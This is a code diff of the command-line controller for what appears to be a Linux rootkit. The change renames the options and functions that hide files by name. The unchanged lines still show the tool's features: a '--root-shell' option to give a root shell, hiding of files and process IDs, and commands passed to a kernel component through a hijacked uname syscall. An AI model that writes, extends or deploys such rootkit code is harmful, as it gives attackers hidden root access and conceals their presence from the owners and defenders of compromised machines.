@@ -24,8 +24,8 @@ static struct option long_options[] = {
 	{"unhide-file", 1, 0, 4},
 	{"hide-pid", 1, 0, 5},
 	{"unhide-pid", 1, 0, 6},
-	{"hide-file-sw", 1, 0, 7},
-	{"unhide-file-sw", 1, 0, 8},
+	{"hide-filename", 1, 0, 7},
+	{"unhide-filename", 1, 0, 8},
 	{"debug-rk", 0, 0, 9},
 	{"debug-stats", 0, 0, 10},
 	{0, 0, 0, 0}
@@ -39,8 +39,8 @@ void usage(const char *path)
 		"\t--root-shell\t\tgive a root shell\n"			\
 		"\t--hide-file <path>\thide file\n"			\
 		"\t--unhide-file <path>\tunhide file\n"			\
-		"\t--hide-file-sw <name>\thide file starting with <name>\n"\
-		"\t--unhide-file-sw <name>\tunhide file starting with <name>\n"\
+		"\t--hide-filename <name>\thide filename\n"		\
+		"\t--unhide-filename <name>\tunhide filename\n"		\
 		"\t--debug-rk\t\t(for debugging purpose)\n"		\
 		"\t--debug-stats\t\t(for debugging purpose)\n"		\
 		, path);
@@ -136,7 +136,7 @@ void unhide_pid(pid_t pid)
 	unhide_file(proc_path);
 }
 
-void hide_file_starting_with(const char *name)
+void hide_filename(const char *name)
 {
 	struct rk_args args;
 
@@ -147,7 +147,7 @@ void hide_file_starting_with(const char *name)
 	syscall(SYS_uname, &args);
 }
 
-void unhide_file_starting_with(const char *name)
+void unhide_filename(const char *name)
 {
 	struct rk_args args;
 
@@ -200,10 +200,10 @@ int main(int argc, char **argv)
 			unhide_pid(atoi(optarg));
 			break;
 		case 7:
-			hide_file_starting_with(optarg);
+			hide_filename(optarg);
 			break;
 		case 8:
-			unhide_file_starting_with(optarg);
+			unhide_filename(optarg);
 			break;
 		case 9:
 			args.mode = DEBUG_RK;
